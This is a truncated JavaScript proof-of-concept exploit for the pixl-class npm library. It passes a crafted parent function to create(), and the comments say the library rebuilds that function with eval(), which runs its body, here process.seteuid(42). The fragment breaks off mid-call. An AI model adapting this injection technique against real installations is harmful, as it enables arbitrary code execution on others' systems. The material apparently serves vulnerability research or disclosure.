```js
const pixlClass = require('pixl-class');

async function exploit() {
    // 1. Craft a parent class whose serialized string representation contains our payload.
    // When .toString() is called on this function, V8 serializes it as:
    // "function MaliciousParent() { process.seteuid(42); }"
    const maliciousParent = function() {
        process.seteuid(42);
    };

    // 2. Pass the crafted parent to the vulnerable create() API.
    // The library's inheritance fallback detects members.__parent and attempts 
    // to dynamically reconstruct a constructor using eval().
    pixlClass.create({
        __parent: maliciousParent
